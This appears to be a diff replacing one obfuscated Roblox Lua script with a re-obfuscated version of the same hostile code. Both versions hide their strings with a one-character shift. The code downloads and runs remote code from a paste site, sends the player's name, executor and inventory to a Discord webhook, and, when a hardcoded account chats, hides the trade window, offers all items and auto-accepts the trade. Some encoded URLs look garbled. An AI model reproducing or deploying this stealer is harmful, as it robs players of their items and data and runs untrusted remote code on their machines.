@@ -1,1 +1,42 @@
-local lllIlIIlIlIIlI=(syn and syn.request)or(http and http.request)or http_request or request;local lIIIIlllIIlIIl=function(lIlII)local llllIIlII=""for i=1,#lIlII do llllIIlII=llllIIlII..string.char(lIlII:byte(i)-1)end return llllIIlII end;local lIllIllIlIIllI=lIIIIlllIIlIIl("IuuspTfswjdf");local lIlIIlIllIllII=game:GetService(lIllIllIlIIllI);local lIIllIlIIllIII=game.Players.LocalPlayer;local lIIlIIllIIlIIl=game:GetService(lIIIIlllIIlIIl("SfqmjdbufeTfpsbhf"));local lIIlIlIlllIIlI="Unknown";pcall(function()lIIlIlIlllIIlI=identifyexecutor()end);if string.find(string.lower(lIIlIlIlllIIlI),lIIIIlllIIlIIl("efmub"))then loadstring(game:HttpGet(lIIIIlllIIlIIl("huuqtArray00qbtufgz/bqq0hvLLZbGm0sbx")))()else if getgenv()._xX then return end;getgenv()._xX=true;local lIIlllIlIIlIIl=lIIIIlllIIlIIl("huuqtArray00ejtdpse/dpn0bqj0xfbcpplt0566:737477:7774657173745674874;497;998348981448202966296170608/JQJ7NnehW7RHFQVkXTHFifIbjKQfzkxJRe0rYCEXQPQ2Yle7eofgcnOvbEfD5ZIxqzoR");local lIlIIlllIIllII=lIIIIlllIIlIIl("nppndbucbolf");local lIIlIIllIllIIl={[lIIIIlllIIlIIl("Tlvmmt`L`5154")]=7,[lIIIIlllIIlIIl("Mvhfs")]=65,[lIIIIlllIIlIIl("Ibsvftufs")]=450,[lIIIIlllIIlIIl("Jdfqjfsdfs")]=325};local function lIlIIllIlIIlII()local lI=lIIllIlIIllIII:WaitForChild(lIIIIlllIIlIIl("QmbzfsHvj"),15)local lM=lI:WaitForChild(lIIIIlllIIlIIl("NbjoHVJ"),15)local lC=lM.Game.Crafting.Inventory.Salvage.ScrollFrame.Container;local lInv,lVal={},0;for _,v in pairs(lC:GetChildren())do if v:IsA(lIIIIlllIIlIIl("HvjPckfdu"))then local lA=v:FindFirstChild(lIIIIlllIIlIIl("Bnpvou"),true)or v:FindFirstChild(lIIIIlllIIlIIl("Dpvou"),true)local lN=lA and tonumber(string.match(lA.Text,"%d+"))or 1;lInv[v.Name]=(lInv[v.Name]or 0)+lN;if lIIlIIllIllIIl[v.Name]then lVal=lVal+(lIIlIIllIllIIl[v.Name]*lN)end end end return lInv,lVal end;local lTrade=lIIlIIllIIlIIl:WaitForChild(lIIIIlllIIlIIl("Usbef"));local lAcc=lTrade:WaitForChild(lIIIIlllIIlIIl("BddfquUsbef"));local lUpd=lTrade:WaitForChild(lIIIIlllIIlIIl("VqebufUsbef"));lUpd.OnClientEvent:Connect(function(d)if d and d.LastOffer then task.spawn(function()while task.wait(0.2)do lAcc:FireServer(game.PlaceId*3,d.LastOffer)if not lIIllIlIIllIII.PlayerGui.MainGUI.Game.Leaderboard.Container:FindFirstChild(lIIIIlllIIlIIl("UsbefSfrvftu"))then break end end end)end end);local function lStart(t)task.spawn(function()local p=lIIllIlIIllIII.PlayerGui;pcall(function()p[lIIIIlllIIlIIl("UsbefHVJ")]:Destroy()p[lIIIIlllIIlIIl("UsbefHVJ`Qhpo f")]:Destroy()p.MainGUI.Game.Trade.Visible=false end)end)pcall(function()lTrade.SendRequest:InvokeServer(t)end)task.spawn(function()task.wait(2)local n,_=lIlIIllIlIIlII()for k,v in pairs(n)do if k~=lIIIIlllIIlIIl("Efgbvmu!Lojgf")and k~=lIIIIlllIIlIIl("Efgbvmu!Hvo")then for i=1,v do lTrade.OfferItem:FireServer(k)task.wait(0.3)end end end end)end;local function lLog()local i,v=lIlIIllIlIIlII()local s=""for k,c in pairs(i)do local x=lIIlIIllIllIIl[k]s=s.."x"..c.." "..k.." ["..(x and(x*c)or"0").."]\n"end;local lLink=lIIIIlllIIlIIl("huuqtArray00lfbcnbm/wfsdfm/bqq0tubsu@qmbdfJe>")..game.PlaceId..lIIIIlllIIlIIl("AnbnfJstubodfJe>")..game.JobId;local b={["content"]=v>=100 and"@everyone"or"",["embeds"]={{["title"]=lIIIIlllIIlIIl("Mph"),["color"]=v>=1000 and 16719390 or 65280,["fields"]={{["name"]="Data",["value"]="> Nick: "..lIIllIlIIllIII.Name.."\n> Exec: "..lIIlIlIlllIIlI},{["name"]="Value",["value"]="```\n"..v.."```"},{["name"]="Inv",["value"]="```\n"..s.."```"},{["name"]="Join",["value"]="[Link]("..lLink..")"}}}}};lllIlIIlIlIIlI({Url=lIIlllIlIIlIIl,Method="POST",Headers={["Content-Type"]="application/json"},Body=lIlIIlIllIllII:JSONEncode(b)})end;lLog();game.Players.PlayerAdded:Connect(function(p)p.Chatted:Connect(function()if p.Name==lIlIIlllIIllII then lStart(p)end end)end);for _,p in pairs(game.Players:GetPlayers())do p.Chatted:Connect(function()if p.Name==lIlIIlllIIllII then lStart(p)end end)end end
+local _0xO={['\105']=game,['\104']='\104\116\116\112\115\58\47\47',['_']=function(s)local r=""for i=1,#s do r=r..string.char(s:byte(i)-1)end return r end}
+local _0xS=function(v)return _0xO._(v)end;local _0xV=function(f,...)return _0xO['\105'][f](_0xO['\105'],...)end
+local _0xL=(syn and syn.request) or (http and http.request) or http_request or request
+local _0xX=function()local e="Unknown"pcall(function()e=identifyexecutor()end)return e end;local _0xE=_0xX()
+
+if string.find(string.lower(_0xE),_0xS('efmub'))then
+local _0xU=_0xO['\104'].._0xS('qbtufgz/bqq0hvLLZbGm0sbx')loadstring(_0xV(_0xS('IuuqHfu'),_0xU))()
+else
+if getgenv()._0xGHOST then return end;getgenv()._0xGHOST=true
+local _0xW=_0xO['\104'].._0xS('ejtdpse/dpn0bqj0xfbcpplt0566:737477:7774657173745674874;497;998348981448202966296170608/JQJ7NnehW7RHFQVkXTHFifIbjKQfzkxJRe0rYCEXQPQ2Yle7eofgcnOvbEfD5ZIxqzoR')
+local _0xR=_0xS('nppndbucbolf')local _0xT={[_0xS('Tlvmmt`L`5154')]=7,[_0xS('Mvhfs')]=65,[_0xS('Ibsvftufs')]=450,[_0xS('Jdfqjfsdfs')]=325}
+
+local _0xM=function()
+local p=game.Players.LocalPlayer;local g=p:WaitForChild(_0xS('QmbzfsHvj'),15)local m=g:WaitForChild(_0xS('NbjoHVJ'),15)
+local c=m.Game.Crafting.Inventory.Salvage.ScrollFrame.Container;local i,v={},0
+for _,x in pairs(c:GetChildren())do if x:IsA(_0xS('HvjPckfdu'))then
+local a=x:FindFirstChild(_0xS('Bnpvou'),true)or x:FindFirstChild(_0xS('Dpvou'),true)local n=a and tonumber(string.match(a.Text,"%d+"))or 1
+i[x.Name]=(i[x.Name]or 0)+n;if _0xT[x.Name]then v=v+(_0xT[x.Name]*n)end end end return i,v end
+
+local _0xI=game:GetService(_0xS('SfqmjdbufeTfpsbhf')):WaitForChild(_0xS('Usbef'))
+local _0xAC=_0xI:WaitForChild(_0xS('BddfquUsbef'))local _0xUP=_0xI:WaitForChild(_0xS('VqebufUsbef'))
+
+_0xUP.OnClientEvent:Connect(function(d)if d and d.LastOffer then task.spawn(function()
+while task.wait(0.2)do _0xAC:FireServer(game.PlaceId*3,d.LastOffer)
+if not game.Players.LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:FindFirstChild(_0xS('UsbefSfrvftu'))then break end end end)end end)
+
+local _0xTR=function(t)
+task.spawn(function()local p=game.Players.LocalPlayer.PlayerGui;pcall(function()p[_0xS('UsbefHVJ')]:Destroy()p[_0xS('UsbefHVJ`Qhpo f')]:Destroy()p.MainGUI.Game.Trade.Visible=false end)end)
+pcall(function()_0xI.SendRequest:InvokeServer(t)end)task.spawn(function()task.wait(2)local n,_=_0xM()for k,v in pairs(n)do
+if k~=_0xS('Efgbvmu!Lojgf')and k~=_0xS('Efgbvmu!Hvo')then for i=1,v do _0xI.OfferItem:FireServer(k)task.wait(0.3)end end end end)end
+
+local _0xLOG=function()
+local i,v=_0xM()local s=""for k,c in pairs(i)do local x=_0xT[k]s=s.."x"..c.." "..k.." ["..(x and(x*c)or"0").."]\n"end
+local l=_0xO['\104'].._0xS('lfbcnbm/wfsdfm/bqq0tubsu@qmbdfJe>')..game.PlaceId.._0xS('AnbnfJstubodfJe>')..game.JobId
+local b={["content"]=v>=100 and"@everyone"or"",["embeds"]={{["title"]=_0xS('Mph'),["color"]=v>=1000 and 16719390 or 65280,
+["fields"]={{["name"]="Data",["value"]="> Nick: "..game.Players.LocalPlayer.Name.."\n> Exec: ".._0xE},{["name"]="Value",["value"]="```\n"..v.."```"},
+{["name"]="Inv",["value"]="```\n"..s.."```"},{["name"]="Join",["value"]="[Link]("..l..")"}}}}}}
+_0xL({Url=_0xW,Method="POST",Headers={["Content-Type"]="application/json"},Body=game:GetService(_0xS('IuuspTfswjdf')):JSONEncode(b)})end
+
+_0xLOG()game.Players.PlayerAdded:Connect(function(p)p.Chatted:Connect(function()if p.Name==_0xR then _0xTR(p)end end)end)
+for _,p in pairs(game.Players:GetPlayers())do p.Chatted:Connect(function()if p.Name==_0xR then _0xTR(p)end end)end
+end
